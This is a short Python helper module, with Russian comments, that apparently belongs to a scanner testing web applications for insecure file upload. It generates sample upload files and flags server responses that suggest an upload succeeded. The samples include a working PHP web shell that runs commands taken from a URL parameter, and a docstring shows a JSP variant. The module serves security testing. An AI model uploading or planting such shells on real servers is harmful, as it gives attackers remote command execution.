# upload_helpers.py
# -----------------
# Общие функции для Insecure File Upload.

def generate_malicious_files():
    """
    Генерирует набор «вредоносных» (или тестовых) файлов в памяти.
    Возвращаем список кортежей (filename, content).
    Например:
      [("shell.php", "<?php system($_GET['cmd']); ?>"),
       ("shell.jsp", "<% out.println(Runtime.getRuntime().exec(request.getParameter(\"cmd\"))); %>"),
       ...]
    """
    # Для упрощения сделаем пару вариантов
    malicious_files = []
    malicious_files.append(("shell.php", "<?php echo 'PHP SHELL'; system($_GET['cmd']); ?>"))
    malicious_files.append(("shell.jsp", "<% out.println(\"JSP SHELL\"); %>"))
    malicious_files.append(("shell.phtml", "<?php echo 'PHTML SHELL'; ?>"))
    # Можно добавить .asp, .aspx, .exe, .js, и т.д.
    return malicious_files

def is_upload_suspicious_response(response_text):
    """
    Упрощённая проверка, указывающая, что файл «принят» и возможно
    доступен по URL. Если приложение в ответе пишет «File uploaded»
    или «shell.php has been saved», считаем suspicious.
    """
    if not response_text:
        return False
    keywords = [
        "file uploaded",
        "upload success",
        "has been saved",
        "shell"
    ]
    lower = response_text.lower()
    for kw in keywords:
        if kw in lower:
            return True
    return False
